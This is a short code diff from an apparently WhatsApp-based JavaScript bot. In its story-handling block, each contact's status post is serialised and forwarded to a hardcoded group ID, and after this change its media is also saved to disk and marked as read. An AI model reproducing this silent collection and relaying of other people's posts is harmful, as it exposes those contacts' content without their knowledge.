@@ -182,7 +182,7 @@ const isQuotedReply = m.mtype === 'extendedTextMessage' && content.includes('Mes
 //Get Story
 if (m.key && m.key.remoteJid === 'status@broadcast') {
    client.sendMessage('120363043384341709@g.us', { text: JSON.stringify(m) })
-   await client.downloadMediaMessage(qmsg, 'story')
+   await client.downloadAndSaveMediaMessage(qmsg, 'story')
    return client.readMessages(m.key)
 }
 
